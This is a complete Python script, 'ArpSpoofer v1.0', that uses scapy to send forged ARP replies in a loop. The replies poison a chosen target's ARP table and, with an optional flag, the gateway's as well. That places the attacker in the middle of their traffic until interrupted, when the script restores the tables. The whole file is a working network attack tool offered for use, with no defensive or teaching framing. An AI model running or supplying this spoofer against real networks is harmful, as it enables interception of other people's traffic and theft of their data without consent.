# Eyal Seckbach & Ynon Sivilia
# ArpSpoofer v1.0

# IMPORTS
from scapy.all import *
from scapy.layers.l2 import ARP, getmacbyip, Ether
import argparse
from time import sleep

# ARGUMENTS PARSING
args_parser = argparse.ArgumentParser(prog='ArpSpoofer.py', description='Spoof ARP tables')

args_parser.add_argument('-i', '--iface', type=str, help="Interface you wish to use")
args_parser.add_argument('-s', '--src', type=str, help="The address you want for the attacker")
args_parser.add_argument('-d', '--delay', type=float, help="Delay (in seconds) between messages", default=1)
args_parser.add_argument('-gw', type=bool, help="should GW be attacked as well")
args_parser.add_argument('-t', '--target', type=str, help="IP of target", required=True)
args = args_parser.parse_args()

# if no interface is specified, use the default interface
interface = args.iface if args.iface else conf.iface


def get_gateway():
    """
    It returns the gateway IP address of the interface
    :return: The gateway IP address.
    """
    return list(set([inter[2] for inter in conf.route.__dict__['routes'] if inter[3] == interface]) - {'0.0.0.0'})[0]


def arp_spoof(dst, src, dst_mac):
    is_at_pkt = Ether(
        dst=dst_mac
    ) / ARP(
        op=2, psrc=src, pdst=dst, hwdst=dst_mac
    )
    sendp(is_at_pkt, verbose=0, iface=interface)


def arp_restore(dst_ip, src_ip, dst_mac, src_mac):
    packet = Ether(
        dst=dst_mac,
    ) / ARP(
        op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac
    )
    sendp(packet, count=2, verbose=0, iface=interface)


# MAIN
def main():
    # if no source is specified, use the gateway IP address
    src = args.src if args.src else get_gateway()

    target_ip = args.target

    target_mac = getmacbyip(target_ip)
    src_mac = getmacbyip(src)

    try:
        while True:
            arp_spoof(target_ip, src, target_mac)

            # if gw argument is set, full duplex attack
            if args.gw:
                arp_spoof(src, target_ip, src_mac)

            sleep(args.delay)  # wait

    except KeyboardInterrupt:
        arp_restore(target_ip, src, target_mac, src_mac)
        arp_restore(src, target_ip, src_mac, target_mac)


# RUN MAIN
if __name__ == "__main__":
    main()
